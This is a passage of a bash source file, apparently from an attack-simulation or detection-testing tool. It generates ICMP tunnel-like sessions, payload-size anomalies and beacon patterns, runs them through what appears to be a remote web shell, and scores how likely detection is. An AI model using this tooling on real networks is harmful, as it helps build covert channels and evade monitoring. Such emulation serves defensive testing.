            breply=$(( (sent > 0) ? (sent - replies) * 100 / sent : 0 ))
            icmp_log_burst_result_summary "${burst_id}" "${count}" "${sent}" "${replies}" "${breply}" "30" "${WEBSHELL_LAST_EXIT_CODE:-0}" "${ICMP_LAST_ROOT_CAUSE:-ok}"
        fi
        total_sent=$((total_sent + sent))
        total_replies=$((total_replies + replies))
        icmp_log_tunnel_burst "${target}" "${burst_id}" "${payload}" "${count}" "${interval_ms}" "${sent}" "${replies}" "${burst_result}"
        [[ "${DRY_RUN}" != true ]] && interruptible_sleep 2 || true
    done
    t1=$(date +%s)
    elapsed=$((t1 - t0))
    ICMP_TUNNEL_DURATION_ELAPSED="${elapsed}"
    ICMP_INTERVAL_MS="${interval_ms}"
    _icmp_eval_detection_likelihood "${total_sent}" "${payload}" "${elapsed}" 0 0 "${payload}" dw_likelihood dw_reason
    ICMP_DETECTION_WINDOW_LIKELIHOOD="${dw_likelihood}"
    ICMP_DETECTION_LIKELIHOOD="${dw_likelihood}"
    apply_icmp_tunnel_stats_to_globals "${total_sent}" "${total_replies}" 0 $((total_sent * 92)) "${payload}" "icmp-beacon-pattern" "${ICMP_COMMAND_EXECUTED}"
    icmp_compute_tunnel_like_score "${total_sent}" "${total_replies}" "${elapsed}" "${payload}" "${payload}" "${interval_ms}"
    icmp_resolve_tunnel_like_session_result "${total_sent}" "${total_replies}" "${ICMP_TUNNEL_LIKE_SCORE}" "${dw_likelihood}"
    icmp_emit_burst_aggregation
    icmp_emit_mode_summary "ICMP_BEACON_SUMMARY" "icmp-beacon-pattern"
    printf '%s' "ICMP_TUNNEL_STATS planned_packets=${ICMP_PACKETS_PLANNED} attempted_packets=${ICMP_PACKETS_PLANNED} actual_packets=${total_sent} partial_packets_estimated=0 timeout_bursts=0 successful_bursts=${burst_id} failed_bursts=0 attempted=${total_sent} total=${total_replies} replies=${total_replies} loss_pct=0 bytes=$((total_sent * 92)) payload=${payload} payload_min=${payload} payload_max=${payload} payload_avg=${payload} baseline=${total_sent} large=0 large_payload_ratio=0 duration_seconds=${elapsed} tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE} interval_ms=${interval_ms} bidirectional_ratio=${ICMP_BIDIRECTIONAL_RATIO} detection_likelihood=${dw_likelihood} detection_reason=${dw_reason} result=${ICMP_TUNNEL_FINAL_RESULT:-partial} cmd=${ICMP_COMMAND_EXECUTED} mode=icmp-beacon-pattern target=${target} campaign=${campaign}\nICMP_TUNNEL_DONE campaign=${campaign}"
}

run_icmp_tunnel_auto_fallback_chain() {
    local target="$1" campaign="$2"
    local out="" combined=""
    ICMP_FALLBACK_MODES_ATTEMPTED=""
    icmp_tunnel_log_both "ICMP_FALLBACK_CHAIN start target=${target} modes=tunnel-like-session,payload-size-anomaly,icmp-beacon-pattern"
    out=$(run_icmp_tunnel_like_session "${target}" "${campaign}")
    combined="${out}"
    ICMP_FALLBACK_MODES_ATTEMPTED="tunnel-like-session"
    apply_icmp_tunnel_burst_stats_from_output "${out}" || true
    if icmp_tunnel_session_success_met; then
        ICMP_MODE_USED="tunnel-like-session"
        icmp_tunnel_log_both "ICMP_FALLBACK_CHAIN success mode=tunnel-like-session actual=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED}"
        printf '%s' "${combined}"
        return 0
    fi
    icmp_tunnel_log_both "ICMP_FALLBACK_CHAIN downgrade from=tunnel-like-session to=payload-size-anomaly actual=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED} score=${ICMP_TUNNEL_LIKE_SCORE}"
    out=$(run_icmp_payload_size_anomaly_simulation "${target}" "${campaign}")
    combined="${combined}${out}"
    ICMP_FALLBACK_MODES_ATTEMPTED="${ICMP_FALLBACK_MODES_ATTEMPTED},payload-size-anomaly"
    apply_icmp_tunnel_burst_stats_from_output "${out}" || true
    if icmp_payload_anomaly_success_met || icmp_tunnel_session_success_met; then
        ICMP_MODE_USED="payload-size-anomaly"
        icmp_resolve_payload_anomaly_result "${ICMP_PACKETS_ATTEMPTED:-0}" "${ICMP_REPLIES_RECEIVED:-0}"
        icmp_tunnel_log_both "ICMP_FALLBACK_CHAIN success mode=payload-size-anomaly large=${ICMP_LARGE_PACKETS} actual=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED} result=${ICMP_TUNNEL_FINAL_RESULT:-partial} detection_readiness=${ICMP_DETECTION_READINESS:-LOW}"
        printf '%s' "${combined}"
        return 0
    fi
    icmp_tunnel_log_both "ICMP_FALLBACK_CHAIN downgrade from=payload-size-anomaly to=icmp-beacon-pattern"
    out=$(run_icmp_beacon_pattern_simulation "${target}" "${campaign}")
    combined="${combined}${out}"
    ICMP_FALLBACK_MODES_ATTEMPTED="${ICMP_FALLBACK_MODES_ATTEMPTED},icmp-beacon-pattern"
    apply_icmp_tunnel_burst_stats_from_output "${out}" || true
    ICMP_MODE_USED="icmp-beacon-pattern"
    icmp_tunnel_log_both "ICMP_FALLBACK_CHAIN final mode=icmp-beacon-pattern actual=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED} result=${ICMP_TUNNEL_FINAL_RESULT:-partial}"
    printf '%s' "${combined}"
    return 0
}

icmp_build_burst_ping_commands() {
    local target="$1" payload="$2" count="$3" interval="$4" fb1_count="$5" fb1_interval="$6" fb2_count="$7"
    local primary="" fb1="" fb2=""
    primary=$(build_icmp_ping_command "${count}" "${payload}" "${interval}" "${target}")
    fb1=$(build_icmp_ping_command "${fb1_count}" "${payload}" "${fb1_interval}" "${target}")
    if [[ "${ICMP_PING_STYLE:-unix}" == windows ]]; then
        fb2="ping -n ${fb2_count} -l ${payload} ${target}"
    else
        fb2="ping -c ${fb2_count} -s ${payload} ${target}"
    fi
    printf '%s\n' "${primary}" "${fb1}" "${fb2}"
}

icmp_extract_ping_count_from_cmd() {
    local cmd="$1" n=""
    n=$(sed -n 's/.*-c \([0-9][0-9]*\).*/\1/p' <<< "${cmd}" | head -n1)
    [[ -z "${n}" ]] && n=$(sed -n 's/.*-n \([0-9][0-9]*\).*/\1/p' <<< "${cmd}" | head -n1)
    safe_int "${n:-0}"
}

log_icmp_burst_diagnostics() {
    local target="$1" cmd="$2" expected_duration="$3" out="$4"
    local safe_out used_cmd=""
    safe_out=$(icmp_sanitize_log_value "${out}")
    used_cmd=$(printf '%s\n' "${out}" | tr -d '\r' | sed -n 's/.*ICMP_TUNNEL_CMD used=\(.*\)/\1/p' | tail -n1)
    [[ -z "${used_cmd}" ]] && used_cmd="${cmd}"
    if [[ "${used_cmd}" != "${cmd}" ]]; then
        icmp_tunnel_log_both "ICMP_TUNNEL_BURST_COMMAND target=${target} cmd=${used_cmd} expected_duration=${expected_duration}s fallback=yes"
        state_append "icmp_tunnel_burst.log" "ICMP_TUNNEL_BURST_COMMAND target=${target} cmd=${used_cmd} expected_duration=${expected_duration}s fallback=yes"
    fi
    icmp_tunnel_log_both "ICMP_TUNNEL_BURST_RAW_OUTPUT target=${target} output=${safe_out}"
    state_append "icmp_tunnel_burst.log" "ICMP_TUNNEL_BURST_RAW_OUTPUT target=${target} output=${safe_out}"
    printf '%s\n' "${out}" | tr -d '\r' | while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        state_append "icmp_tunnel_burst.log" "ICMP_TUNNEL_BURST_RAW_OUTPUT target=${target} line=${line}"
    done
}

parse_icmp_burst_stats_from_output() {
    local out="$1" fallback_cmd="$2" payload="${3:-1400}"
    local sent=0 replies=0 loss_pct=0 bytes=0 stats_found=0 attempted_pkt=0
    local used_cmd="" line total=0 echo_cnt=0 ttl_ex=0 dest_un=0 targets=0
    out=$(printf '%s' "${out}" | tr -d '\r')
    used_cmd=$(printf '%s\n' "${out}" | sed -n 's/.*ICMP_TUNNEL_CMD used=\(.*\)/\1/p' | tail -n1)
    [[ -z "${used_cmd}" ]] && used_cmd=$(printf '%s\n' "${out}" | sed -n 's/.*ICMP_TUNNEL_CMD primary=\(.*\)/\1/p' | tail -n1)
    [[ -z "${used_cmd}" ]] && used_cmd="${fallback_cmd}"
    read -r sent replies <<< "$(parse_icmp_ping_transmit_receive "${out}")"
    sent=$(safe_int "${sent}")
    replies=$(safe_int "${replies}")
    if (( replies == 0 )); then
        replies=$(printf '%s' "${out}" | grep -ciE 'bytes from|Reply from|ttl=[0-9]' || true)
        replies=$(safe_int "${replies}")
    fi
    if (( sent == 0 && replies > 0 )); then
        sent=$(icmp_extract_ping_count_from_cmd "${used_cmd}")
        (( sent == 0 )) && sent="${replies}"
    fi
    if (( sent == 0 && replies == 0 )); then
        sent=$(icmp_extract_ping_count_from_cmd "${used_cmd}")
    fi
    line=$(printf '%s\n' "${out}" | grep 'ICMP_TUNNEL_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        stats_found=1
        attempted_pkt=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        total=$(safe_int "$(sed -n 's/.*total=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        echo_cnt=$(safe_int "$(sed -n 's/.*echo=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        ttl_ex=$(safe_int "$(sed -n 's/.*ttl_exceeded=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        dest_un=$(safe_int "$(sed -n 's/.*dest_unreachable=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        targets=$(safe_int "$(sed -n 's/.*targets=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        if (( sent < 1 )); then
            sent=$(safe_int "$(sed -n 's/.*sent=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
            (( sent < 1 )) && sent="${attempted_pkt}"
        fi
        if (( replies < 1 )); then
            replies=$(safe_int "$(sed -n 's/.*replies=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
            (( replies < 1 )) && replies="${total}"
            (( replies < 1 )) && replies="${echo_cnt}"
        fi
        loss_pct=$(safe_int "$(sed -n 's/.*loss_pct=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        bytes=$(safe_int "$(sed -n 's/.*bytes=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    fi
    if (( sent > 0 && replies == 0 )); then
        replies=$(printf '%s' "${out}" | grep -ciE 'bytes from|Reply from|ttl=[0-9]' || true)
        replies=$(safe_int "${replies}")
    fi
    if (( sent > 0 && replies > 0 && loss_pct == 0 && sent > replies )); then
        loss_pct=$(( (sent - replies) * 100 / sent ))
    fi
    (( bytes < 1 && sent > 0 )) && bytes=$((sent * (payload + 28)))
    printf '%s %s %s %s %s %s %s %s %s %s %s' \
        "${total}" "${echo_cnt}" "${ttl_ex}" "${dest_un}" "${targets}" "${stats_found}" "${attempted_pkt}" \
        "${sent}" "${replies}" "${loss_pct}" "${bytes}"
}

build_icmp_remote_stats_script() {
    local ping_cmd="$1" payload="$2" mode="$3" target="$4" campaign="$5" fb1_cmd="${6:-}" fb2_cmd="${7:-}"
    cat <<EOF
${REMOTE_SHELL_HELPERS}
payload=${payload}
mode='${mode}'
target='${target}'
campaign='${campaign}'
sent=0; replies=0; loss_pct=0; bytes_est=0; duration_ms=0
primary_cmd='${ping_cmd}'
fb1_cmd='${fb1_cmd}'
fb2_cmd='${fb2_cmd}'
used_cmd="\${primary_cmd}"
icmp_count_replies(){
  local text="\$1" n=0
  n=\$(printf '%s' "\${text}" | grep -ciE 'bytes from|Reply from|ttl=[0-9]' || true)
  printf '%s' "\${n:-0}"
}
icmp_cmd_rejected(){
  printf '%s' "\$1" | grep -qiE 'permission denied|operation not permitted|not permitted|invalid option|cannot flood|bad interval|only root|unknown option.*-i|you must be root'
}
icmp_extract_transmitted(){
  local text="\$1" n=0
  n=\$(printf '%s' "\${text}" | sed -n 's/.* \\([0-9][0-9]*\\) packets transmitted.*/\\1/p' | tail -n1)
  [ -z "\${n}" ] && n=\$(printf '%s' "\${text}" | sed -n 's/.* \\([0-9][0-9]*\\) transmitted.*/\\1/p' | tail -n1)
  printf '%s' "\${n:-0}"
}
icmp_extract_received(){
  local text="\$1" n=0
  n=\$(printf '%s' "\${text}" | sed -n 's/.* \\([0-9][0-9]*\\) received.*/\\1/p' | tail -n1)
  [ -z "\${n}" ] && n=\$(printf '%s' "\${text}" | sed -n 's/.* \\([0-9][0-9]*\\) packets received.*/\\1/p' | tail -n1)
  [ -z "\${n}" ] || [ "\${n}" -eq 0 ] 2>/dev/null && n=\$(icmp_count_replies "\${text}")
  printf '%s' "\${n:-0}"
}
icmp_count_from_cmd(){
  local cmd="\$1" n=0
  n=\$(printf '%s' "\${cmd}" | sed -n 's/.*-c \\([0-9][0-9]*\\).*/\\1/p')
  [ -z "\${n}" ] && n=\$(printf '%s' "\${cmd}" | sed -n 's/.*-n \\([0-9][0-9]*\\).*/\\1/p')
  printf '%s' "\${n:-0}"
}
icmp_output_usable(){
  local text="\$1"
  if icmp_cmd_rejected "\${text}"; then return 1; fi
  printf '%s' "\${text}" | grep -qiE 'transmitted|received|bytes from|Reply from|ttl=' && return 0
  return 1
}
t0=\$(date +%s 2>/dev/null || echo 0)
out=\$(eval "\${primary_cmd}" 2>&1) || true
if ! icmp_output_usable "\${out}"; then
  if [ -n "\${fb1_cmd}" ]; then
    used_cmd="\${fb1_cmd}"
    out=\$(eval "\${fb1_cmd}" 2>&1) || true
  fi
fi
if ! icmp_output_usable "\${out}"; then
  if [ -n "\${fb2_cmd}" ]; then
    used_cmd="\${fb2_cmd}"
    out=\$(eval "\${fb2_cmd}" 2>&1) || true
  fi
fi
t1=\$(date +%s 2>/dev/null || echo 0)
duration_ms=\$(( (t1 - t0) * 1000 ))
sent=\$(icmp_extract_transmitted "\${out}")
replies=\$(icmp_extract_received "\${out}")
if [ "\${sent}" -eq 0 ] 2>/dev/null; then
  sent=\$(icmp_count_from_cmd "\${used_cmd}")
fi
if [ "\${replies}" -eq 0 ] 2>/dev/null; then
  replies=\$(icmp_count_replies "\${out}")
fi
if [ "\${sent}" -eq 0 ] 2>/dev/null && [ "\${replies}" -gt 0 ] 2>/dev/null; then
  sent=\$(icmp_count_from_cmd "\${used_cmd}")
  [ "\${sent}" -eq 0 ] 2>/dev/null && sent=\${replies}
fi
[ -z "\${sent}" ] && sent=0
[ -z "\${replies}" ] && replies=0
if [ "\${sent}" -gt 0 ] 2>/dev/null; then
  loss_pct=\$(( (sent - replies) * 100 / sent ))
else
  loss_pct=0
fi
bytes_est=\$((sent * (payload + 28)))
[ "\${used_cmd}" != "\${primary_cmd}" ] && echo "ICMP_TUNNEL_CMD_FALLBACK used=\${used_cmd}"
echo "ICMP_TUNNEL_CMD primary=\${primary_cmd}"
echo "ICMP_TUNNEL_CMD used=\${used_cmd}"
echo "ICMP_TUNNEL_BURST_ECHO_BEGIN"
printf '%s\n' "\${out}" | head -c 12000
echo "ICMP_TUNNEL_BURST_ECHO_END"
echo "ICMP_TUNNEL_STATS attempted=\${sent} total=\${replies} echo=\${replies} ttl_exceeded=0 dest_unreachable=0 targets=1 sent=\${sent} replies=\${replies} loss_pct=\${loss_pct} bytes=\${bytes_est} payload=\${payload} duration_ms=\${duration_ms} mode=\${mode} target=\${target} campaign=\${campaign} fallback=burst shell=${ICMP_PING_STYLE:-unix}"
echo "ICMP_TUNNEL_DONE campaign=\${campaign}"
EOF
}

parse_icmp_tunnel_stats_line() {
    local out="$1" line stats_found=0
    local total=0 echo_cnt=0 ttl_ex=0 dest_un=0 targets=0 attempted_pkt=0
    local sent=0 replies=0 loss_pct=0 bytes=0
    line=$(printf '%s\n' "${out}" | grep 'ICMP_TUNNEL_STATS' | tail -n1 || true)
    if [[ -n "${line}" ]]; then
        stats_found=1
        attempted_pkt=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        total=$(safe_int "$(sed -n 's/.*total=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        echo_cnt=$(safe_int "$(sed -n 's/.*echo=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        ttl_ex=$(safe_int "$(sed -n 's/.*ttl_exceeded=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        dest_un=$(safe_int "$(sed -n 's/.*dest_unreachable=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        targets=$(safe_int "$(sed -n 's/.*targets=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        sent=$(safe_int "$(sed -n 's/.*sent=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        replies=$(safe_int "$(sed -n 's/.*replies=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        loss_pct=$(safe_int "$(sed -n 's/.*loss_pct=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        bytes=$(safe_int "$(sed -n 's/.*bytes=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
        (( sent < 1 )) && sent="${attempted_pkt}"
        (( replies < 1 )) && replies="${total}"
        if (( sent > 0 && replies < sent && loss_pct == 0 )); then
            loss_pct=$(( (sent - replies) * 100 / sent ))
        fi
    fi
    printf '%s %s %s %s %s %s %s %s %s %s %s' \
        "${total}" "${echo_cnt}" "${ttl_ex}" "${dest_un}" "${targets}" "${stats_found}" "${attempted_pkt}" \
        "${sent}" "${replies}" "${loss_pct}" "${bytes}"
}

apply_icmp_tunnel_stats_to_globals() {
    local attempted="$1" replies="$2" loss="$3" bytes="$4" sizes="$5" mode="$6" cmd="$7"
    ICMP_PACKETS_ATTEMPTED="${attempted}"
    ICMP_TOTAL_PACKETS="${attempted}"
    ICMP_ECHO_COUNT="${replies}"
    ICMP_REPLIES_RECEIVED="${replies}"
    ICMP_PACKET_LOSS="${loss}"
    ICMP_OVERALL_LOSS="${loss}"
    ICMP_ESTIMATED_BYTES="${bytes}"
    ICMP_PAYLOAD_SIZES_USED="${sizes}"
    ICMP_MODE_USED="${mode}"
    ICMP_PAYLOAD_MODE="${mode}"
    ICMP_COMMAND_EXECUTED="${cmd}"
}

compute_icmp_detection_likelihood() {
    _icmp_eval_detection_likelihood "$1" "$2" "${3:-${ICMP_TUNNEL_DURATION_ELAPSED:-0}}" \
        "${ICMP_LARGE_PACKETS:-0}" "${ICMP_LARGE_PAYLOAD_RATIO:-0}" "${ICMP_PAYLOAD_SIZE_MAX:-0}" \
        ICMP_DETECTION_LIKELIHOOD ICMP_DETECTION_REASON
}

icmp_tunnel_classify_execution_result() {
    local sent="$1" received="$2"
    sent=$(safe_int "${sent}")
    received=$(safe_int "${received}")
    if (( sent == 0 )); then
        ICMP_TUNNEL_RESULT="command_execution_failed"
        ICMP_TUNNEL_FINAL_RESULT="failed"
        ICMP_SKIP_REASON="command_execution_failed"
        ICMP_FAILURE_CLASS="${ICMP_FAILURE_CLASS:-command_execution_failed}"
        ICMP_FAILURE_REASON="${ICMP_FAILURE_REASON:-${ICMP_SKIP_REASON}}"
        icmp_tunnel_log_both "ICMP_EXECUTION_FAILURE failure_class=${ICMP_FAILURE_CLASS} failure_reason=${ICMP_FAILURE_REASON} exit_code=${ICMP_EXEC_FAILURE_EXIT_CODE:-unknown} stderr=${ICMP_EXEC_FAILURE_STDERR:-n/a} timeout=n/a binary_found=${ICMP_BINARY_FOUND:-unknown} command=${ICMP_COMMAND_EXECUTED:-n/a}"
        return 1
    fi
    if (( received == 0 )); then
        ICMP_TUNNEL_RESULT="target_unresponsive"
        ICMP_TUNNEL_FINAL_RESULT="partial"
        ICMP_SKIP_REASON="target_unresponsive"
        ICMP_FAILURE_CLASS="${ICMP_FAILURE_CLASS:-target_unresponsive}"
        ICMP_FAILURE_REASON="${ICMP_FAILURE_REASON:-target did not respond to ICMP echo}"
        icmp_tunnel_log_both "ICMP_EXECUTION_FAILURE failure_class=${ICMP_FAILURE_CLASS} failure_reason=${ICMP_FAILURE_REASON} exit_code=${ICMP_EXEC_FAILURE_EXIT_CODE:-0} stderr=${ICMP_EXEC_FAILURE_STDERR:-n/a} timeout=n/a binary_found=${ICMP_BINARY_FOUND:-yes} command=${ICMP_COMMAND_EXECUTED:-n/a}"
        return 1
    fi
    if [[ "${ICMP_MODE_USED:-}" == tunnel-like-session ]]; then
        icmp_resolve_tunnel_like_session_result "${sent}" "${received}" "${ICMP_TUNNEL_LIKE_SCORE:-0}" "${ICMP_DETECTION_LIKELIHOOD:-LOW}"
        ICMP_SKIP_REASON=""
        [[ "${ICMP_TUNNEL_RESULT}" == success ]] && return 0
        return 0
    fi
    if icmp_is_anomaly_only_mode "${ICMP_MODE_USED:-}"; then
        icmp_resolve_payload_anomaly_result "${sent}" "${received}"
        ICMP_SKIP_REASON=""
        [[ "${ICMP_TUNNEL_RESULT}" == success ]] && return 0
        return 0
    fi
    ICMP_TUNNEL_RESULT="success"
    ICMP_TUNNEL_FINAL_RESULT="success"
    ICMP_SKIP_REASON=""
    ICMP_FAILURE_CLASS=""
    ICMP_FAILURE_REASON=""
    return 0
}

build_icmp_size_anomaly_chunk_script() {
    local target="$1" chunk_packets="$2" campaign="$3"
    cat <<EOF
${REMOTE_SHELL_HELPERS}
target='${target}'
campaign='${campaign}'
chunk=${chunk_packets}
sent=0; replies=0; payload_sum=0; payload_min=99999; payload_max=0
t0=\$(date +%s 2>/dev/null || echo 0)
i=0
while [ "\${i}" -lt "\${chunk}" ]; do
  i=\$((i + 1))
  payload=\$((1300 + ( (\$(date +%s 2>/dev/null || echo 0) + i) % 151 )))
  sent=\$((sent + 1))
  payload_sum=\$((payload_sum + payload))
  [ "\${payload}" -lt "\${payload_min}" ] 2>/dev/null && payload_min=\${payload}
  [ "\${payload}" -gt "\${payload_max}" ] 2>/dev/null && payload_max=\${payload}
  if [ "${ICMP_PING_STYLE:-unix}" = "windows" ]; then
    out=\$(ping -n 1 -l \${payload} -w 2000 \${target} 2>&1) || true
  else
    out=\$(ping -c 1 -s \${payload} -W 2 \${target} 2>&1) || true
  fi
  if printf '%s' "\${out}" | grep -qiE 'bytes from|Reply from|ttl=[0-9]'; then
    replies=\$((replies + 1))
  fi
  sleep_sec=\$(awk -v r="\${RANDOM:-\$(date +%s)}" -v i="\${i}" 'BEGIN{srand(r+i); printf "%.1f", 0.3 + int(rand()*8)*0.1}')
  sleep "\${sleep_sec}" 2>/dev/null || sleep 1
done
t1=\$(date +%s 2>/dev/null || echo 0)
duration_ms=\$(( (t1 - t0) * 1000 ))
[ "\${payload_min}" -eq 99999 ] 2>/dev/null && payload_min=0
bytes_est=\$((sent * (payload_sum / (sent > 0 ? sent : 1) + 28)))
echo "ICMP_TUNNEL_CHUNK_STATS sent=\${sent} replies=\${replies} payload_sum=\${payload_sum} payload_min=\${payload_min} payload_max=\${payload_max} duration_ms=\${duration_ms} bytes=\${bytes_est} target=\${target} campaign=\${campaign}"
EOF
}

parse_icmp_chunk_payload_stats() {
    local out="$1" line
    local sent=0 replies=0 psum=0 pmin=0 pmax=0 duration_ms=0 bytes=0
    line=$(printf '%s\n' "${out}" | grep 'ICMP_TUNNEL_CHUNK_STATS' | tail -n1 || true)
    if [[ -z "${line}" ]]; then
        sent=$(printf '%s\n' "${out}" | grep -c '^ICMP_PACKET_SENT' 2>/dev/null || true)
        sent=$(safe_int "${sent}")
        replies=$(printf '%s\n' "${out}" | grep -c '^ICMP_PACKET_REPLY' 2>/dev/null || true)
        replies=$(safe_int "${replies}")
        printf '%s %s 0 0 0 0 0' "${sent}" "${replies}"
        return 0
    fi
    sent=$(safe_int "$(sed -n 's/.*sent=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    replies=$(safe_int "$(sed -n 's/.*replies=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    psum=$(safe_int "$(sed -n 's/.*payload_sum=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    pmin=$(safe_int "$(sed -n 's/.*payload_min=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    pmax=$(safe_int "$(sed -n 's/.*payload_max=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    duration_ms=$(safe_int "$(sed -n 's/.*duration_ms=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    bytes=$(safe_int "$(sed -n 's/.*bytes=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
    printf '%s %s %s %s %s %s %s' "${sent}" "${replies}" "${psum}" "${pmin}" "${pmax}" "${duration_ms}" "${bytes}"
}

icmp_tunnel_merge_payload_stats() {
    local new_sum="$1" new_min="$2" new_max="$3" new_count="$4"
    local cur_sum=0 cur_min=0 cur_max=0 cur_count=0
    new_sum=$(safe_int "${new_sum}")
    new_min=$(safe_int "${new_min}")
    new_max=$(safe_int "${new_max}")
    new_count=$(safe_int "${new_count}")
    cur_sum=$(safe_int "${ICMP_PAYLOAD_SIZE_SUM_INTERNAL:-0}")
    cur_count=$(safe_int "${ICMP_PAYLOAD_SIZE_COUNT_INTERNAL:-0}")
    cur_min=$(safe_int "${ICMP_PAYLOAD_SIZE_MIN}")
    cur_max=$(safe_int "${ICMP_PAYLOAD_SIZE_MAX}")
    ICMP_PAYLOAD_SIZE_SUM_INTERNAL=$((cur_sum + new_sum))
    ICMP_PAYLOAD_SIZE_COUNT_INTERNAL=$((cur_count + new_count))
    if (( new_count > 0 )); then
        if (( cur_count == 0 || new_min < cur_min || cur_min == 0 )); then
            ICMP_PAYLOAD_SIZE_MIN="${new_min}"
        fi
        if (( new_max > cur_max )); then
            ICMP_PAYLOAD_SIZE_MAX="${new_max}"
        fi
    fi
    if (( ICMP_PAYLOAD_SIZE_COUNT_INTERNAL > 0 )); then
        ICMP_PAYLOAD_SIZE_AVG=$((ICMP_PAYLOAD_SIZE_SUM_INTERNAL / ICMP_PAYLOAD_SIZE_COUNT_INTERNAL))
    fi
}

build_icmp_tunnel_like_chunk_remote_script() {
    local target="$1" session_id="$2" seq_start="$3" chunk_packets="$4" payload="$5" interval_ms="$6" campaign="$7"
    cat <<EOF
${REMOTE_SHELL_HELPERS}
target='${target}'
campaign='${campaign}'
session_id=${session_id}
seq_start=${seq_start}
chunk=${chunk_packets}
payload_size=${payload}
interval_ms=${interval_ms}
sent=0; replies=0; t0=\$(date +%s 2>/dev/null || echo 0)
i=0
while [ "\${i}" -lt "\${chunk}" ]; do
  seq=\$((seq_start + i))
  i=\$((i + 1))
  sent=\$((sent + 1))
  pat=\$(printf '%08x%04xCF00' "\${session_id}" "\${seq}")
  if [ "${ICMP_PING_STYLE:-unix}" = "windows" ]; then
    out=\$(ping -n 1 -l \${payload_size} -w 2000 \${target} 2>&1) || true
  else
    out=\$(ping -c 1 -s \${payload_size} -p "\${pat}" -W 2 \${target} 2>&1) || true
  fi
  got_reply=no
  if printf '%s' "\${out}" | grep -qiE 'bytes from|Reply from|ttl=[0-9]'; then
    replies=\$((replies + 1))
    got_reply=yes
  fi
  echo "ICMP_PACKET_SENT session_id=\${session_id} seq=\${seq} payload_bytes=\${payload_size} interval_ms=\${interval_ms} chunk_marker=CF target=\${target}"
  if [ "\${got_reply}" = yes ]; then
    echo "ICMP_PACKET_REPLY session_id=\${session_id} seq=\${seq} payload_bytes=\${payload_size} interval_ms=\${interval_ms} target=\${target}"
  fi
  sleep_sec=\$(awk -v ms="\${interval_ms}" 'BEGIN{printf "%.3f", ms/1000}')
  sleep "\${sleep_sec}" 2>/dev/null || sleep 1
done
t1=\$(date +%s 2>/dev/null || echo 0)
duration_ms=\$(( (t1 - t0) * 1000 ))
bytes_est=\$((sent * (payload_size + 28)))
echo "ICMP_TUNNEL_CHUNK_STATS sent=\${sent} replies=\${replies} payload_sum=\$((payload_size * sent)) payload_min=\${payload_size} payload_max=\${payload_size} duration_ms=\${duration_ms} bytes=\${bytes_est} session_id=\${session_id} interval_ms=\${interval_ms} target=\${target} campaign=\${campaign} mode=tunnel-like-session"
EOF
}

run_icmp_tunnel_like_session() {
    local target="$1" campaign="$2"
    local payload="${ICMP_TUNNEL_LIKE_PAYLOAD:-512}" interval_ms="${ICMP_TUNNEL_LIKE_INTERVAL_MS:-1000}"
    local duration_goal="${ICMP_TUNNEL_DURATION_SECONDS:-180}" session_id=0
    local chunk_size=25 chunks=0 c=0 remaining=0
    local interval_sec="" remote_cmd="" out="" ping_cmd="" sent=0 replies=0 t0=0 t1=0 elapsed=0
    local total_actual=0 total_replies=0 total_bytes=0 total_burst_attempted=0 overall_loss=0 dw_met=no
    local dw_likelihood="LOW" dw_reason="" planned_packets=0
    local burst_result="" burst_timeout=0 expected_dur=0 root_cause="" failure_reason=""
    local stdout_preview="" stderr_preview="" http_status="" exit_code=0 stdout_bytes=0 burst_elapsed_ms=0
    local parsed_sent=0 parsed_received=0 burst_timed_out=false stats_trusted=false

    payload=$(icmp_tunnel_clamp_payload_size "${payload}")
    (( payload > 900 )) && payload=512
    duration_goal=$(safe_int "${duration_goal}")
    (( duration_goal < 60 )) && duration_goal=60
    interval_ms=$(safe_int "${interval_ms}")
    (( interval_ms < 500 )) && interval_ms=1000
    interval_sec=$(icmp_interval_ms_to_seconds "${interval_ms}")
    planned_packets=$((duration_goal * 1000 / interval_ms))
    (( planned_packets < 40 )) && planned_packets=40
    (( planned_packets > 200 )) && planned_packets=200
    ICMP_PACKETS_PLANNED="${planned_packets}"
    ICMP_PARTIAL_PACKETS_ESTIMATED=0
    ICMP_TIMEOUT_BURSTS=0
    ICMP_SUCCESSFUL_BURSTS=0
    ICMP_FAILED_BURSTS=0
    session_id=$(date +%s)
    ICMP_INTERVAL_MS="${interval_ms}"
    ICMP_PAYLOAD_SIZE_MIN="${payload}"
    ICMP_PAYLOAD_SIZE_MAX="${payload}"
    ICMP_PAYLOAD_SIZE_AVG="${payload}"
    ICMP_BASELINE_PACKETS=0
    ICMP_LARGE_PACKETS=0
    ICMP_LARGE_PAYLOAD_RATIO=0
